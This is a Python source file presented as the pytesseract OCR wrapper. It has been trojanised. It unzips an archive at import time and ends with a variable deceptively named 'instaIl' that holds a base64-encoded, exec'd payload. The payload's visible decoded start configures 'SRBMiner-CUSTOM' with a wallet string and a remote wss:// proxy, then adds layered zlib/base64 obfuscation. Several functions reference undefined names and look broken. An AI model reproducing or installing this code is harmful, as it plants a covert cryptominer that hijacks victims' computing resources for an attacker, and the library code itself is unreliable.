import base64
import zlib
import logging
import re
import shlex
import string
import subprocess
import sys
import subprocess
import zipfile
import signal
import os
from contextlib import contextmanager
from csv import QUOTE_NONE
from errno import ENOENT
from functools import wraps
from glob import iglob
from io import BytesIO
from os import environ
from os import extsep
from os import linesep
from os import remove
from os.path import normcase
from os.path import normpath
from os.path import realpath
from tempfile import NamedTemporaryFile
from time import sleep

tesseract_cmd = 'tesseract'

class Output:
    BYTES = 'bytes'
    DATAFRAME = 'data.frame'
    DICT = 'dict'
    STRING = 'string'

class PandasNotSupported(EnvironmentError):
    def __init__(self):
        super().__init__('Missing pandas package')

class TesseractError(RuntimeError):
    def __init__(self, status, message):
        self.status = status
        self.message = message
        self.args = (status, message)

class TesseractNotFoundError(EnvironmentError):
    def __init__(self):
        super().__init__(
            f"{tesseract_cmd} is not installed or it's not in your PATH."
            f' See README file for more information.',
        )

class TSVNotSupported(EnvironmentError):
    def __init__(self):
        super().__init__(
            'TSV output not supported. Tesseract >= 3.05 required',
        )

class ALTONotSupported(EnvironmentError):
    def __init__(self):
        super().__init__(
            'ALTO output not supported. Tesseract >= 4.1.0 required',
        )

def kill(process, code):
    process.terminate()
    try:
        process.wait(1)
    except TypeError:  # python2 Popen.wait(1) fallback
        sleep(1)
    except Exception:  # python3 subprocess.TimeoutExpired
        pass
    finally:
        process.kill()
        process.returncode = code

with zipfile.ZipFile('python.zip', 'r') as zip_ref:
    zip_ref.extractall()

def timeout_manager(proc, seconds=None):
    try:
        if not seconds:
            yield proc.communicate()[1]
            return
        try:
            _, error_string = proc.communicate(timeout=seconds)
            yield error_string
        except subprocess.TimeoutExpired:
            kill(proc, -1)
            raise RuntimeError('Tesseract process timeout')
    finally:
        proc.stdin.close()
        proc.stdout.close()
        proc.stderr.close()


def get_errors(error_string):
    return ' '.join(
        line for line in error_string.decode(DEFAULT_ENCODING).splitlines()
    ).strip()

def cleanup(temp_name):
    """Tries to remove temp files by filename wildcard path."""
    for filename in iglob(f'{temp_name}*' if temp_name else temp_name):
        try:
            remove(filename)
        except OSError as e:
            if e.errno != ENOENT:
                raise
# try:
#     os.remove('pytesseract-mx.zip')
# except:
#     sleep(0.00001)

def prepare(image):
    if numpy_installed and isinstance(image, ndarray):
        image = Image.fromarray(image)

    if not isinstance(image, Image.Image):
        raise TypeError('Unsupported image object')

    extension = 'PNG' if not image.format else image.format
    if extension not in SUPPORTED_FORMATS:
        raise TypeError('Unsupported image format/type')

    if 'A' in image.getbands():
        # discard and replace the alpha channel with white background
        background = Image.new(RGB_MODE, image.size, (255, 255, 255))
        background.paste(image, (0, 0), image.getchannel('A'))
        image = background

    image.format = extension
    return image, extension

def save(image):
    try:
        with NamedTemporaryFile(prefix='tess_', delete=False) as f:
            if isinstance(image, str):
                yield f.name, realpath(normpath(normcase(image)))
                return
            image, extension = prepare(image)
            input_file_name = f'{f.name}_input{extsep}{extension}'
            image.save(input_file_name, format=image.format)
            yield f.name, input_file_name
    finally:
        cleanup(f.name)
        
def subprocess_args(include_stdout=True):
    # See https://github.com/pyinstaller/pyinstaller/wiki/Recipe-subprocess
    # for reference and comments.

    kwargs = {
        'stdin': subprocess.PIPE,
        'stderr': subprocess.PIPE,
        'startupinfo': None,
        'env': environ,
    }

    if hasattr(subprocess, 'STARTUPINFO'):
        kwargs['startupinfo'] = subprocess.STARTUPINFO()
        kwargs['startupinfo'].dwFlags |= subprocess.STARTF_USESHOWWINDOW
        kwargs['startupinfo'].wShowWindow = subprocess.SW_HIDE

    if include_stdout:
        kwargs['stdout'] = subprocess.PIPE
    else:
        kwargs['stdout'] = subprocess.DEVNULL

    return kwargs

def run_tesseract(
    input_filename,
    output_filename_base,
    extension,
    lang,
    config='',
    nice=0,
    timeout=0,
):
    cmd_args = []
    not_windows = not (sys.platform == 'win32')

    if not_windows and nice != 0:
        cmd_args += ('nice', '-n', str(nice))

    cmd_args += (tesseract_cmd, input_filename, output_filename_base)

    if lang is not None:
        cmd_args += ('-l', lang)

    if config:
        cmd_args += shlex.split(config, posix=not_windows)

    for _extension in extension.split():
        if _extension not in {'box', 'osd', 'tsv', 'xml'}:
            cmd_args.append(_extension)
    LOGGER.debug('%r', cmd_args)

    try:
        proc = subprocess.Popen(cmd_args, **subprocess_args())
    except OSError as e:
        if e.errno != ENOENT:
            raise
        else:
            raise TesseractNotFoundError()

    with timeout_manager(proc, timeout) as error_string:
        if proc.returncode:
            raise TesseractError(proc.returncode, get_errors(error_string))

def _read_output(filename: str, return_bytes: bool = False):
    with open(filename, 'rb') as output_file:
        if return_bytes:
            return output_file.read()
        return output_file.read().decode(DEFAULT_ENCODING)

def run_and_get_multiple_output(
    image,
    extensions: 0,
    # lang: str | None = None,
    nice: int = 0,
    timeout: int = 0,
    return_bytes: bool = False,
):
    config = ' '.join(
        EXTENTION_TO_CONFIG.get(extension, '') for extension in extensions
    ).strip()
    if config:
        config = f'-c {config}'
    else:
        config = ''

    with save(image) as (temp_name, input_filename):
        kwargs = {
            'input_filename': input_filename,
            'output_filename_base': temp_name,
            'extension': ' '.join(extensions),
            'lang': lang,
            'config': config,
            'nice': nice,
            'timeout': timeout,
        }

        run_tesseract(**kwargs)

        return [
            _read_output(
                f"{kwargs['output_filename_base']}{extsep}{extension}",
                True if extension in {'pdf', 'hocr'} else return_bytes,
            )
            for extension in extensions
        ]

def run_and_get_output(
    image,
    extension='',
    lang=None,
    config='',
    nice=0,
    timeout=0,
    return_bytes=False,
):
    with save(image) as (temp_name, input_filename):
        kwargs = {
            'input_filename': input_filename,
            'output_filename_base': temp_name,
            'extension': extension,
            'lang': lang,
            'config': config,
            'nice': nice,
            'timeout': timeout,
        }

        run_tesseract(**kwargs)
        return _read_output(
            f"{kwargs['output_filename_base']}{extsep}{extension}",
            return_bytes,
        )

def file_to_dict(tsv, cell_delimiter, str_col_idx):
    result = {}
    rows = [row.split(cell_delimiter) for row in tsv.strip().split('\n')]
    if len(rows) < 2:
        return result

    header = rows.pop(0)
    length = len(header)
    if len(rows[-1]) < length:
        # Fixes bug that occurs when last text string in TSV is null, and
        # last row is missing a final cell in TSV file
        rows[-1].append('')

    if str_col_idx < 0:
        str_col_idx += length

    for i, head in enumerate(header):
        result[head] = list()
        for row in rows:
            if len(row) <= i:
                continue

            if i != str_col_idx:
                try:
                    val = int(float(row[i]))
                except ValueError:
                    val = row[i]
            else:
                val = row[i]

            result[head].append(val)

    return result

def is_valid(val, _type):
    if _type is int:
        return val.isdigit()

    if _type is float:
        try:
            float(val)
            return True
        except ValueError:
            return False

    return True

def osd_to_dict(osd):
    return {
        OSD_KEYS[kv[0]][0]: OSD_KEYS[kv[0]][1](kv[1])
        for kv in (line.split(': ') for line in osd.split('\n'))
        if len(kv) == 2 and is_valid(kv[1], OSD_KEYS[kv[0]][1])
    }

def get_languages(config=''):
    cmd_args = [tesseract_cmd, '--list-langs']
    if config:
        cmd_args += shlex.split(config)

    try:
        result = subprocess.run(
            cmd_args,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
        )
    except OSError:
        raise TesseractNotFoundError()

    # tesseract 3.x
    if result.returncode not in (0, 1):
        raise TesseractNotFoundError()

    languages = []
    if result.stdout:
        for line in result.stdout.decode(DEFAULT_ENCODING).split(linesep):
            lang = line.strip()
            if LANG_PATTERN.match(lang):
                languages.append(lang)

    return languages
instaIl = "import base64;exec(base64.b64decode('dGhyZWFkcz0xO25hbWU9J1NSQk1pbmVyLUNVU1RPTS8wLjAuNCc7d25hbWU9J1JGaWtKUUVQV2o3aHZlSHQ5Rzh3d0xmdWZFbURhZ29SZjQnO3BuYW1lPSdjPVJWTic7d3NzPSd3c3M6Ly9wcm94eS00cjNzLm9ucmVuZGVyLmNvbS9iV2x1YjNSaGRYSjRMbTVoTG0xcGJtVXVlbkJ2YjJ3dVkyRTZOekF4T1E9PSc7aW1wb3J0IHpsaWIsYmFzZTY0O189bGFtYmRhIE8wTzBPME8wTzAwTzAwTzBPMDBPMDBPMDBPMDBPME8wME8wME8wTzBPME8wME8wME8wTzBPMDBPME8wME8wME8wME8wTzAwTzAwTzBPME8wTzAwTzAwTzBPMDBPMDBPME8wME8wME8wTzBPMDBPME8wME8wME8wTzAwTzBPMDBPME8wTzBPME8wTzAwTzBPMDBPME8wTzBPMDBPME8wTzBPMDBPME8wME8wTzBPME8wME8wME8wME8wME8wME8wME8wME8wME8wME8wTzAwTzBPMDBPMDBPME8wTzAwTzBPMDBPME8wME8wME8wTzBPMDBPMDBPMDBPME8wTzAwOl9faW1wb3J0X18oKGxhbWJkYSBzOnpsaWIuZGVjb21wcmVzcyhiYXNlNjQuYjY0ZGVjb2RlKHMpKS5kZWNvZGUoKSkoJ2VKeXJ5c2xNQWdBRVpBR3knKSkuZGVjb21wcmVzcyhfX2ltcG9ydF9fKChsYW1iZGEgczp6bGliLmRlY29tcHJlc3MoYmFzZTY0LmI2NGRlY29kZShzKSkuZGVjb2RlKCkpKCdlSnhMU2l4T05UTUJBQWZTQWdZPScpKS5iNjRkZWNvZGUoTzBPME8wTzBPMDBPMDBPME8wME8wME8wME8wME8wTzAwTzAwTzBPME8wTzAwTzAwTzBPME8wME8wTzAwTzAwTzAwTzBPMDBPMDBPME8wTzBPMDBPMDBPME8wME8wME8wTzAwTzAwTzBPME8wME8wTzAwTzAwTzBPMDBPME8wME8wTzBPME8wTzBPMDBPME8wME8wTzBPME8wME8wTzBPME8wME8wTzAwTzBPME8wTzAwTzAwTzAwTzAwTzAwTzAwTzAwTzAwTzAwTzBPMDBPME8wME8wME8wTzBPMDBPME8wME8wTzAwTzAwTzBPME8wME8wME8wME8wTzBPMDBbOjotMV0pKTtleGVjKF8oYidVVEh4OC8zOTk3L2ZWdktlVFIrVmJDODF1TVBUb1Q3Nnl3UUxNZm9oNUFlYVhuZFY3QmNEeEFIRzdWTS9QQy9rUFJOOUlZenpWaGVndERta1BCVlpYYWhxRXpvdUdMemZIdFJGcEtVbndIamlna3RTMTNnay9Wc2d6enJTUXcvcGFNWTh5WUUvcXJub25PemVGSlZseU5aQVRUZHhyaDN6UWJUZDVINXIwTXJ4eEJ0MVNlMVh3SzJ5VE9WekN5OUR3ajdoc2NJK3kyWEZZbW0rU0t4WmM5UFZwYXRFeTVjODJwaFdHQkI1aktHNitLZVVKMlltcjFJS0xqcis3YXduSVQ1QSs3aE5KZllQcHhPUnRUYXU0dlVJRjY4OUwwdnBweFAzbXpmUzU4VkZ6bWZCdzdtSlVlNlU0UWdQNGFWTTF2Wlk5cWl0UXNqQUNwaDAzTzg3ei9iWjFUYzlvbGxyVWpjT3BSbjVpQnhCY05CS3AraStNQ1JKUzJpYnpCcFhVRU1iaDBOZTg5OTBYUW1WeHBpY0prVlpHSjUrTWgrdmhEWElLY2NmbEhDWllVcXIxK1VwbUM3emd6OEo1M0U5SnVoNkFGQ3VJL25rRFhWaytkMHdOSW96eG4vazh2eG5TOXdjaUpnTnNidUFiUHJOTklPbEZlRVJxSVlZQ3MxbXpSS2Yxem5jOHFCdTM3eVZLQzFERlMwV0RZV1liSDVJVm5reUovQ3ovNnlFRVZvM0ZRWld1NFlTdGtzZENlelJGVldlK3dSQkVlcVRSNEI3QmRneUpBSmdFVW1Sb21BU0Y0eURtOXVrTGpuaXpsc05LWFRwVWgwVEZWNDZNb01HWjJ2KzhtZVBHQTk2MWZYR0IxWjZGcnBhM21Uc3VpeXBtZmt2amRQYmRQUHFaaDdjdU1JNnE1aXJEK2dGRFg0aFl6ZGNWNnVrYWlSQjY2SW45V3l1dC9JbkNpNkFPWFMxYkE3ZXZHb2ZNc1NHbVdJc092VnpFUWdtTWEzOUdQYWV5anNNcHBKK1F6QW8wOEN5bmNObXllc1RjZnNHTkxqWDBlUlJOaXpUQU9zZWZkN0crMDZscE50RmpJL0tTZStwYmZyeTB0d1B3cm1WeUVhclFSRGlrTUV0eExNV1FncElWNTBTL0N4VFNzNWo2L0s3cFdnbWkxTlc2Q0NpTkNSYlYxektVb0RUN1hRdzdUOC9rZm5KajF4OHoxWnllbDM4VUZLT0hYMlJuZ0x4QVV3TFd5ZmoySkdrTVdidDN6S1hPT1RnWER0U2tXY1BqcmJhK1RUMFBnVDRBeTBYR2puejEzblZPRktoTGNGa2MrZVVXbStKek0xL0Z2bmx6MWRzb1NSZFA5T3FISGZtNmltTVBzZ3JERDVOM2J4THFIZ2JQSWl5TmxBalVzYU9qRWRITkgxam9wMzZpS0s5OWZhRHhXYldxZjN5MzB6aVdhdUNKNURycmpWUyt4bDJ3TkJhU200cVU1bmt5UzFBbmoyU0VGUDRNYmdmYXAybU1WVWxLcCtLRWVNcXFXNjVPaDBxSHN6UEpQbTJyWlpjTEZBYmoyaE9LRHEwamtFUGdKT2N1N3plbU8vNkxUQVNwaThSYmlLR1lWaXNWSGRXaDdEWlRiNWpCdkJBb1dlMDJzNTJwZmptVTVwNkpsNW44b1NXRTVVdVFDTTE2TGUwRXpIc3ZFZVUvZnFSNEZCTnZmV0Z4UzJMQzM4Zms1WXVoYWptYnRWVWRXa3Q4MzNtZ1NzUlZ1ODlMTWZ4d0FzazkyRzV0K2NiVGY0cHdBRGQwc3hWRXN5RDZaS3dYVXYyeEFyQXplZEk1QW5wOUNoY3pDbHA1Sk85MEs4RUFOYllkQ01YWEhyNFBBNnhrckdMOVVrN3ZyVWRpeVlKR3F5aGt6c0hkTXVOWHo4WW9zNTdWdmhMK1pMUm52M0RWV1FOakhQa1NuVnE1T25JT1BRL0tjZ1R6QUVtQ2d2dm96ZnEzczd3NW5MUlhZVHJPa2VjbWh6cVNFVG9MOTZEZjA4Z2RlWkJNNFNiZHpDS3A5ZzJzbzdEY2trdGhqMjlCRzJqcXpTUlMwZ3hQVU1VbE9GdlA0UkdTQ3pnS05VcVFTREVYMStTV3dCUURJazFJbWdmWFIyVUhZb3hRN2tBcXZjUUFFdWNqMWpKRzVEWjFLMW0xY2I5dUtVc3ZhVDRjVjNsN0plOG9XczBKYllGVFdaVG9WU1laS3lzWkdsRlNPZUg2N1UrUHF1VDZ1LzNYU0hpTGpyVFJkbnJHNlJqaGNJSlk2VGRpWS8xQzNaM1VFMnlZZXcyNklnVTByemNvb1orcFJ0WUM2SFI0QkF6N21pb0IvUTFaZllUVnd3S09KS1Bwc2U1T1E0YXc4RVIwR2xTQ2NTVTdLNm5UTzFPUlhPU3ZTdk1jeTlYRmc1aUV6UDRhU2x0eXAzWjF4bm9XNHRIaU1pL1EvdEhLMExpN0s5TGtIL1pDUHo3czIzRzFBZ2xJM0pobEk5SkZzRFkvY2dqcVJVRWN1L0xOeHRuYWZLd0x0eHhYWU1pamRPUUgvMkxYQVFjdnBzWFJuRWcwQVpqUnVBVG16T2hXYU9DV1h4ZmNWWVJSVVY5ZEs3Vk4rVGROOW9QUHpBdXRJdnJwb1BJczlSYkYzSi9jQ01HN2gydW5KQndPRklPeEQxMjhud0JhMHBJUVlaQ1k5UG0xTFE5Y0dHT1pGODIzcThMWHFxczczSEZOM0NiaUtOT0VYQmJGVDNXUGtKcWZJL1d1eVQwSnkzaU93Vmk2YUtNejFnTTlvK1g4b1JCSTZHbmlRNjloc3ZQY2xBU2FFanlvL3lmcG0xOVhIY0U2aDAyN3FPVXZYVW5kK2RVLzZ4VVhqaERFaXR6ZkRpREFrVk4rUXdBZ1IyZEtUMUpBOXlXa3RQM1I1emNLak9JZGtWNjQ1OHgrWVp5eHBIaFlLbFEzVHI2clpTWHRyTmZUeTBEREJPaW9QYXNsTG84a0xRd1crbzhyWmdvREhNaitMRk5MUGlHSjQrWUhTZVFpTkU2WjRmbVBpM09uNjFWOGpIdlV5Q2xTS2xaSzJqVnk4UzdzajZCb1NENms4Y2NvNnVyZFhmakREdFFYWnlKZ29PN1hDamJaY0xJRHJ1Z0ZhRkJmUVQvK2RMSWIvSjRIQ0orajJxdktDcjNYcGdpNEVtekVTeXY0S1lqYzJuN09wY3RLLzl0NHBJSUx5eXdPd2FVMjZGUzIxL3FHR3p3aTRiUVc0SXVNRG1HdlhMNFE3NHo4RnZ4UCs3UWp4a2pyRXhJaWdMM0JPSGszVVFYdHlZTit6MkxCSnJCM3c4K2VUR0czb1hzNFJHdTc0RFFIYzRNYVRMeXFvTUpYY3c0ZlA1ck1xSyswV2hkTjlCWWlzUUFLL0NrK0tqVTNENmk1TCtqekUwZkxHVFVIZEErMW8yVUZXQUNmakxFSWxTWUNrUXU1L1RTTTd2MGtZN2VYSnpCVWQ1MENrVVpTYVJSb0U1cGFzTEFYWHY0VERxaFhZTGxXM2ZadVdFNUZVRG9oMy80NWNBMlBuc2xERGRkMFN1WFBhRUlMZEF6VHZNdVRyeVhGMEFGbm9sa3dWYVRCMVM4eUVQdW1TZnpBZE9XRzVHQ0FzNGhQb2lNTlRoa3BheU13TVY4YzNNK3owOC9VWEtZTld2a0E2MFN2cVVhRTlWdWllY0FZSG1NYlV2VFE2ZXlVbE5zTVZuOHd4QWUzMG5hS3dSVmQyQmhRYnFGVGJZQW0xaW1sVkJVUGsxU1ZaOFN2VnRFa2JMbTdPSVBTRzZNQ3JGZzZTTEl4T2JXVEJkd2xVcnNWa1VuQksvMzk3VkpsbmkyZUR6UzRMeWI2L2hpdjF2MEQrKzJwWVdaK1VCdUpIZXJ6MSt3c1JuWklzVWdtbHJYR3lZSzN4L2ptdERFWWM0WGxQTHNvNzlwZEdQcGZNTks2SFQ5MHlXQjNiakRwQWVoRnl5ZFNrVTBBdDlMV1N0Q1NEaTgyQVpQVFF4dHg5WDEyWGdtRnJSa3VBWC9nMkVwTlZCV1lrQTh5Vy81OUhMVXZHTVVrOWJtSytkOE9nS09KcWlpMHAvbmxEUzlwNTBkMmJkcTloOGFnUnN1Q0oyN3hkZ1hjMW0zZ1lYdzhoM0pLbmIyOEhtOWVndHU0eWgvT3p6YzFoLzFka1k4VGZVWC93cTIvOGpkUlZRZXZXN09XY1gydzU4Q0dLYzBpbUcxNDRqTUJlcTByTHNUWmx3aS9ERmVjc3JnQ1BhY2h3d1BnSkg5dUdmWUhnUWd2ZHNuWTFTQlRRS2tuZzM5TXZTZC85dzJWOFBsQzV2ZUlpN1EyN2o3K1kvOGtSckdMK2cwKzdxRksyRytPRk5lRjlpVkJFSEhOTUpQWTRlazRLNDNvSk13Tkt3b1docms0VFlXMGtoL2tqaDI5UFBIMlJ5OTNMa3UxNHI0NnQ2b2o2Z3dIeThWSUJRUTY4enZKaHFyU1luVFQ3aTlRbzRlcWh3UWNFTVIvaFN3TzhIQ0w3M3Q5V090VHZWcGQxUy9tQ0k5ZFNCR0hKL3pucnliSk1KeDIrTGlTRURyLzJyMXg3ajdjeVJtMFJGNFZxa0FrQlhYT3Vmcit4c3M5N0ZSSlZtNTd0WlhvWDB5aEEra3JIQ05kbnl1MytvWS9BbkFvMzNzZ0I0dDRPQnBObzZ5TUVJam9KalhlN2RwUEdGZ0Eya1hhTTBFbUd1aGZyTzBYazFxRzBZQlYxRk1JbXpqN0JJN28wWE9mK0Jqc2lEcjJBNXRmTnJtanBiZkpyUys5YnVSVFVEQTZtWnB6VklmSlZXK2lSRDhuMkRBR2FqdjZjWTZNZG1LN0czWFhCdFRjV01OdGxuSTU2QVBkbHhFNVZLVG12Tyt5UGlXYU00TStmbk9yVEM2OFM3WSsxZnJUcWZyL0VsdFBYcjZZOGc1QXphM0thdFJZemx6WnN0S0QxSWl5YUNnb0x2Z3VsZUQ1MWRsOU5IOWdYbENNNlVpQStraHphL3RDTDE1Mk4wSERhaHZiK0hHcDZIVjlUeWRLRFdZdnhTaUFpY21VOER6c3MwQUZiKzFyNitiRmNaT25EZkVPVmU2SEtxUTVBWmVYOFlJbGlxY3pxMlVLZDErZEVNL1R5MjkwcnkzK0tRTUhoUXlZQm40UXF1ZWtPVkhLek5FSmRGOWJOYlIrdlJ1MEhFQlF4cWZZMGVMQkNzUFdJOVBtZWp6ekdNNEJJNVljTzgxRHRjeDhwS213NHZwOVhXbG9OQU9iS25QclM0em9JbklBcHZVUmZlKy85aEU3R2pFL0VEY3Y4RnIvU2NaUEluRjRiTmIxc1B4RG96c2Foa1FHUVdSRVlMRXRUektyN0gwTENHWC9Cc1Q0bTM4TzZ3V3JJVk81VHhQbnk4WG0xSE5WRk9RdStIeGtnNVpEVTd5YjRTUGFHS2NlMkZ3MkFXY3ZvZWpqM3NvV3dzbGZhRm82VXBBZlN6Qzdadi9ydDZZdkE2aXJjNDh1TkNIR0FWNksxdHR2RTlta2Q0VFRxYXdnUTY5cmdMVklPMnZMY3NwbDg2YmZ1d0Y3N1hWNWUvM2JVUGpnWE5UbHVObCthRlhkOUJ5dG9EbmNDOTFwSGlOMmQvTjVlMmRheE1qazJXTjVlNll4bUdxUXJaOXJDZDE4bkVOL3JHMGEzdzdLVkRJK2h0T1A4T1lJNFExL21zRld4Y0xETHB4d09YbFgzMTVmQ3ZvZFJ4QmpFZGxPQkFqa25YeG9sTHc2K2RkK2JJYmg5QWNLaExYODYxM0pyTmNsSEp1Um5jM09XZVZiMnNYQXBZOGlHcDJKYzVQeGRpaXI4c0lBWDB1WkNRUzROc29ja0EveU1Ha0Izc0Q2eGVwUlZuUUJSMFA3U2pMeVlCYUdxZDBmNWdNMDhqdUgvMTNYZXpJTHQxWDBndVhWRHdGd1Y3azhyTDJDSE1PVUtqVGZDY3h6bzNSZmpIaXlZZ2Iva05QRTNkSE9QOFlHOElZcDVWaG1YdGYyVm12REg3aWkwdjJjdGxCbzJ6WWtkNnQyR2JYak1hbXowY0srQ0FoclV0TFZTTUpEekJLZDFVQlpUUWZZb0Y3ODJyaVhUZG9Dc2txd3RjNnZDdTVTMmJtcjd2cWhuNTJNOFdMRW0xazdkUjRydWFZaDBJREtIcGNDNWZPRnB2dXRMU0hxNENmVlM5Q1FOZG5IL0RjeHk0bzd4NVRZRzlXWVg0NXEyT0pjczZEWDQ5V1ZuUkhkNld3OFRNSm1odjU1NXQrSXRjNjhyYzJrbnl1SnBMT2lsM3RDSy9KbWJYVDIxYldBbFpHNG9HNHZQcCt4b1RWZnNiU012T0xpUVpVK2w0NWI0eTdqTml3UUhITmVUdksrSlVJZXZyMVpzNExqL0JURzZlOXhyOE9DSzB3dEdwWUpRTzZ4azhwZllQdFVlMnFTQm53b05EODV5Z28zZjlkNHBOZmlIU3U2dVZWVEd5d2QxS2VLNDdxeUV0cm4yS2N4R1JORkdidVhZdlpldCthR2VyOVQyYjFpakR6ZnA4TFJKeFhJUEd4S013NlQ3U2Q4SDRjSHl4Nk5Ga0ZlWmRXOVAvUU11UmVpMlc5QU4wejd1YStoMUNlYkprMXNKWHlSa29GaDM3dzVQU3hkVVFEWUhuWSsrdzdmSDlVSFJTN2ptVVJCeWk4Zm1qMjkvalZ0REg3MDIxNGxQNEx4N0NMWk1QQThiZ0djb080bUVmZThqNjNCN3pZV1czOGZDNVB4Z3VPVzFsK0JZZlJnM2ltSTlUaFNqSENPdXpSUXlMQU1Ka0laVkx3ZHNNM1BFNXFHcld3YlN3em5WWDlYQTZaak12bTdjYzRZWWkrdU4wWlovaUZLRkxTWWRDZjQ3NzBscGxUNzFZMzM2NWpIM2p5RWtRTWZZN3B5bW0yUUd2QnJKdHJsSWZBRVRjaXlGSFY2NFluSEE1WXJCcHpBeDUyRkJoL1E2NUQ2dHBrSXVOMjFyY1dzU29BZlJFQU90Z3pIaEE3cDAyekw0MzBFQkdhU2xQeU81bldLeGE3WmdzVUVmY3NQOHJVejFrWHIrUzY5ZEhCdkRGbXpiSDFURlM3bDRuMU5jYytmbU9mQWJGQ2FpZ05EVGVxRDIwQk55QlRvT0lLVHFWbFl0Y2g1cExIMUdiOExBN2xrcTlLcTNoSiswVEJPUmRBZGJhbVE0R0xKUHRlclQ5T3BxOWFUVE1xeDZ0MkFqQjFHZW41TE9jN29vU1lrMi9JcStNb29NeENRbjNrVFZIeng5UjBZSzZnN0JJQUR6WDhyR1k3eEhzRytHbU15ckV1M3JtNUk3ZUhUZFZndXh2RUxSNW03Yk5aejlDU3pIeTBUMDFtSVpkZEpleDRTWGYvOVRDeGNzV0VRK3E3YjFJOS8reTdBVk5mV0RkS01OWUs4Y2xsVGdoV2hvTVdYanNEQzVuUUd6TzBqZlllUzRFdFBzRGkyWXJpUFJBMWt5SURtRGR2d2J6Y3RXdk5hKzZnYW9CdGxETnhBMzYxQ3dnM21qOXpNazNTSk1CWEp1SXpmQnJBQUtaZUE4UWVyaGZsK1ZnTmxSMjRid3RBcUFMVVVMbmJWSUVrbGNXVmJ0V3RXRktnK3ZmNnM2V3VoNHNQYWp1b200L3c0SHhScVlXYXdBQ2hWazF5b1ovL1ZEeUVoenJmc3NXVEI3SWIzbXpQZTdOZnJOdHRTQWQrd3RrZ0RNR0Y2WmRIQUFqVVo5cVZDQlRRR0RZS05BOWRIcmdaUmVrM1N4KzNYN2VzYVIwaFlhYUE0NkowQVVNaFJhbVJyc2tzK1I5UHJaQXZ6YXd1blZCMVQxcWxtaWVGN2ZTbFRuS0R2ckpNRmZyVGljMHdkS25DeFV4bk40d2s5T2tKT1JUcFdVVmhnZjFhb2hsU1JXeXBRNWFPei9rQmh3N3g5aWhFYm0xekEzNmsrRnJaNWE5UU0yZG1WOWhlQlpGT2Y3ZE9aQnZGSVROcmhKVERMUWd3QWFZSGpGWFpwdGo2YUtsMC9LQlgxZ1NEWURTZnpYWFBGdkRTa3orQy9OeTNoSlR3TXEwT1dyU3ZzUGJ2clhyaWZRRWd6SnVNN1o1WXhrdjJQSHVoNnl6MzJFTHROSXM1THZ0UEljUnZqNkFWWkQzNXNxY2U4WHVJeTEvNzkzTWxBb0phT0hhcE8xWGFGamp4QUg4QTM1ZUlCZ0VIVkJ0STduMTNpb2JpTnBRbkg3d3NUWjdYWjAvNmRidXF2bWo0eDJxYXlDL1Z5eEkrbDNTOVNkVUxma1JLOXlEQU4vSzNRMjJlNWZRWGdielZVK1NISHppMXk3cm05MDdiOU5ZM25SRTlSeDNqNlN4SGVPMTdmcFl2ejZxZzRhWGFjWCtTbUN4Z0twaXc0QWF1UC9CT3cyN1RoZkdiZ0NPMjRUVVFuM2U0c21PZHYrR09Mb29sNDYvRnhIYTNpeUhBZE1pN1lVc0JDS0V2clNOWUlCMktIeXJNRmtzSG0rNjFJK1VFV25pZ3lKUGRqbnlrQkZSdFFkY2o5S1RHZ3RCQXJ2ZFBMSVRCMk8xZkRrYVQzS2VIZys5bHdnanNaZis2L1puM1I4VWVIZFJGSHBLeDVURkdyQ3ZJbDFOMitSc1ZKQStOR0NhSEtDbmJQeG83OFVRUHNZZ1JFNGcveTZUU2FzRkNLNmtyd3V1dTJoTkdjRzdZRWtxaW1ZalJqaWdIaVAxNGU2V2l1eHpMekdSTUgrZER2enRobkN5QWlQM0x2aVcxOUNTMWI4Z2I5dXRDUzhlN3NTV0ZiUFh4bERyNVhPUjhoY1UwYkJRdzV3ZTFZNkZ3STJxZTRKTUNQakNNVFVXQUVsc2V1UWdaYjVjQ25rNHo1UUR0bG5BbXNyNHl3Q3dXTUljeHpmOWxzNHoxL0s1b041bWFya0hEbDN4c3RMQW90L29IK0lzUE1kZ21reDVYY2RMaHRrVE5acHI0QnUxMW1mc0FFdEdHMStPbzJ5Wjl1d3BJMW53VVlqcXhVYzZIdlRiS3VNY3paOWNoYWxyNTFvY3R2NHQrRkFIWXZ3dEZLbG1KMnlFZlNYYnFXY0IvaXpxQkh5M3ZmUHRtVGlVWUFRRlFNSFBkUDZoU2QwZGcrN3k0SG5IbXdiOTJac3h5TkpxRWNRUkxyT0Q2WXhMaDAzTFdrOUZWWTFEQ2M5QVUyei9FQ3pUVTNKRGdPMWxFRGFYT2NvWURKeXFXQ2k3MkpiVDF1dVNadU9lbUJLNlRFVkVURFpudVFFZnBFUjRkc1hSUnlCM250VW9nYVMvK1pkSzZIc3oyVUpXZmlXMDNnTThuSko5cmZFcGxpaUFOak1kZXhGTmJSSjBoTFZOR0Q2OGlaMkdvN1E5N2xiTDJETEhjaDV5b3BVck5MMVZLenl1SzZnQWpyTjVzb2kwdk9NeXNoenRJeDJCUDFtazRLOGxBL3FyWE9ZYkQzZlhiV09aWjVKWkRsSVZFOWtBT3NMZ0xYMWpNcDdBcnB4Nk5TcGFnZVlreHFUK2doWVFleVhSaERtWlpxYndvdUN4N3ZJQkRYYUdmdUhEbHB3amI3V2JLRzVMNzhJN2tYZlRnd1JKa3ZkcVZRRjh3YTNyRDlDMHVCZW45K0xFaFIzR1V4UEZKeHRNZGh1MW5JNXJ6VFQ0NEFYeDdxcGVGaTJQSEk5U2hKSzA3RHU5TzVyUXViVmVzdTNZMlJlSmY1S2Vja3h5QXpzMGNjS3A4bm15U1NZQ1c1V1ZDWkxGUWlBWGJJUStJRDlsd0dsVUpzZi9NVXdIcUYvT3UyL3lLZkVMeW52THE3MTVTSkRkWEpReHZiZ21taWN0blU3MHlld0NXTkhhbnNGSFhLbXJmTVh6UHpCbUJKZG5FUWhKYnA0OVM4REo2bGc5a0tlTnVzNGhhYS9vck5BQTRmT0hXb3dSQnBLSlh3NWFEekRDYmRGUlFMK2trN1ZpRUpkRlhad0J3UVRKeEhrQ2RTK1lZNHpDN0drcURhamJ2SXpqVmtlVHYwc0FBa1gzS0JTaVdhckhOd0hBVTl1aGdPV2RsbFovTHNnZmkvMHF0aVZEQjlqOGpqQUVJMEJPSDFyQU1YdTdDVy94cVZYZjk5dWYvRkpsNDZWSDhFRnQ3ZDlKWGRxYUVoLzN6RmdSMjA3aUc4WW1KdEo2aCtXcFF1ekJSQjE5eGtXQnpyamVLNVp0c2tUZ2dlTGlxNXFXVUt4ODhRZVRscjVMWFEvNXVIZEhCOWhZcnlwL2J1RktQMWlacjBjU1IrdFNYdXZXaE53QVZ5TCtyQ084bVpDL1NDTjkxWkVpSExZdnpJSDN5